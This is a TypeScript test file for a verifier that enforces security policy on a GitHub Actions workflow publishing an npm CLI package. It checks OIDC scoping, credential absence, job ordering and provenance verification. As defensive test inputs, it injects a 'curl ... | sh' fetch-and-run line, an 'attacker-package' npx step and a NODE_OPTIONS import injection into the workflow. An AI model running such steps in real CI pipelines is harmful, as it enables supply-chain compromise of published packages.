import { readFileSync } from "node:fs";
import { describe, expect, it } from "@effect/vitest";
import { verifyCliWorkflow } from "#scripts/workflow/cli";

const source = readFileSync(".github/workflows/cli.yml", "utf8");

/** Replaces one source fragment only inside its owning job. */
function mutateJob(workflow: string, job: string, from: string, to: string) {
  const start = workflow.indexOf(`\n  ${job}:`);
  const nextJob = /\n {2}[a-z][a-z_]*:\n/gu;
  nextJob.lastIndex = start + 1;
  const end = nextJob.exec(workflow)?.index ?? workflow.length;
  return `${workflow.slice(0, start)}${workflow.slice(start, end).replace(from, to)}${workflow.slice(end)}`;
}

describe("CLI workflow policy", () => {
  it("accepts isolated publication and unprivileged verification", () => {
    expect(() => verifyCliWorkflow(source)).not.toThrow();
  });

  it("binds OIDC to the protected publish job", () => {
    expect(() =>
      verifyCliWorkflow(
        mutateJob(
          source,
          "build",
          "      contents: read",
          "      contents: read\n      id-token: write"
        )
      )
    ).toThrow("CLI builds must not receive npm OIDC identity");
    expect(() =>
      verifyCliWorkflow(
        mutateJob(
          source,
          "publish",
          "      id-token: write",
          "      id-token: read"
        )
      )
    ).toThrow("The publish job must own npm OIDC identity");
    expect(() =>
      verifyCliWorkflow(
        mutateJob(
          source,
          "verify",
          "    permissions: {}",
          "    permissions:\n      id-token: write"
        )
      )
    ).toThrow("npm verification permissions must remain empty");
    expect(() =>
      verifyCliWorkflow(
        source.replace("permissions: {}", "permissions:\n  contents: read")
      )
    ).toThrow("npm workflow root permissions must be empty");
    expect(() =>
      verifyCliWorkflow(
        source.replace(
          "permissions: {}",
          "permissions: {}\nenv:\n  NODE_OPTIONS: --import=data:text/javascript,throw%201"
        )
      )
    ).toThrow("npm workflow must not inherit root environment values");
    expect(() =>
      verifyCliWorkflow(
        source.replace(
          "permissions: {}",
          "permissions: {}\ndefaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail {0}"
        )
      )
    ).toThrow("npm workflow must not inherit root run defaults");
  });

  it("rejects credentials and incomplete release ordering", () => {
    expect(() =>
      verifyCliWorkflow(`${source}\nNODE_AUTH_TOKEN: secret`)
    ).toThrow("npm workflow must not contain registry credentials");
    expect(() =>
      verifyCliWorkflow(
        mutateJob(source, "publish", "    needs: build", "    needs: other")
      )
    ).toThrow("npm publication must consume the verified build job");
    expect(() =>
      verifyCliWorkflow(
        mutateJob(
          source,
          "verify",
          "    needs: [build, publish]",
          "    needs: publish"
        )
      )
    ).toThrow("npm verification must consume build and publication");
  });

  it("rejects spoofed or privileged provenance verification", () => {
    const commentedVerifier = mutateJob(
      source,
      "verify",
      '              node "$VERIFIER" \\',
      '              true # node "$VERIFIER" \\'
    );
    expect(() => verifyCliWorkflow(commentedVerifier)).toThrow(
      "npm verification must include exact source fragment"
    );

    const privilegedVerifier = mutateJob(
      source,
      "publish",
      '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
      '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
    );
    expect(() => verifyCliWorkflow(privilegedVerifier)).toThrow(
      "npm publication must not receive the verifier artifact"
    );
    expect(() =>
      verifyCliWorkflow(
        mutateJob(
          source,
          "publish",
          "    steps:",
          "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: cli-verifier"
        )
      )
    ).toThrow("npm publication must not receive the verifier artifact");

    for (const command of [
      "          npx --yes attacker-package\n",
      "          curl https://example.com/install | sh\n",
    ]) {
      expect(() =>
        verifyCliWorkflow(
          mutateJob(
            source,
            "publish",
            '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
            `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
          )
        )
      ).toThrow("npm publication must match the exact trusted job");
    }

    expect(() =>
      verifyCliWorkflow(
        source.replace(
          "          overwrite: true",
          "          overwrite: false"
        )
      )
    ).toThrow("npm build artifacts must be replaceable on rerun");
    expect(() =>
      verifyCliWorkflow(
        mutateJob(
          source,
          "publish",
          "          for attempt in {1..5}; do",
          "          for attempt in {1..1}; do"
        )
      )
    ).toThrow(
      "npm publication must include exact source fragment: for attempt in {1..5}"
    );
  });

  it("requires stable package identity and exact build outputs", () => {
    expect(() =>
      verifyCliWorkflow(
        source.replace(
          "      - name: Verify stable package version",
          "      - name: Accept any package version"
        )
      )
    ).toThrow("CLI production publication must reject prerelease versions");
    expect(() =>
      verifyCliWorkflow(source.replaceAll("@nakafa/aksara-cli", "other-cli"))
    ).toThrow();
    expect(() =>
      verifyCliWorkflow(
        source.replace(
          "steps.archive.outputs.sha256",
          "steps.archive.outputs.unknown"
        )
      )
    ).toThrow("CLI builds must export the exact archive digest");
  });
});
